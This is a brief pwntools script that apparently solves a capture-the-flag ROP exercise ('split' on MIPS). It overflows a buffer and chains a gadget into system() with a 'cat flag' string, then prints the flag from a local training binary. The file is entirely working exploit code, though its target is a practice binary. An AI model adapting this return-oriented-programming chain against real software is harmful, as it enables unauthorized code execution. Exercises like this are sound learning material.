from pwn import *

system = 0x004009ec
cat_flag = 0x00411010
lw_a0 = 0x00400a20

payload = b"".join([
    b"A"*(32+4),
    p32(lw_a0),
    b"B"*4,
    p32(system),
    p32(cat_flag),
])

#p = process(["qemu-mipsel", "-g", "1234", "./split_mipsel"])
p = process("./split_mipsel")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
